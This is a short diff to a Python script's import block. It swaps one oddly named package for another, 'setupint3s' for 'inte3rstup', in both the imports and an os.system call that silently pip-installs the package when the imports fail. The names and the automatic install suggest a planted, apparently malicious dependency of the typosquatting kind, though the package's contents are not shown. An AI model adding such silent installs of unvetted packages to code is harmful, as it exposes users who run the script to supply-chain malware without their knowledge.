@@ -2,8 +2,7 @@ import os
 import sys
 import time
 try:
-    import requests, threading, time, random, json, tkinter, readchar, urllib3
-    import setupint3s
+    import requests, threading, time, random, json, tkinter, readchar, inte3rstup
     from tkinter import filedialog
     from time import gmtime, strftime
     from console import utils
@@ -11,7 +10,7 @@ try:
     from ctypes import windll
 except:
 
-    os.system(f'python -m pip install requests readchar urllib3 setupint3s console colorama')
+    os.system(f'python -m pip install requests readchar inte3rstup console colorama')
     time.sleep(5)
 
     import requests, threading, time, random, json, tkinter, readchar, urllib3
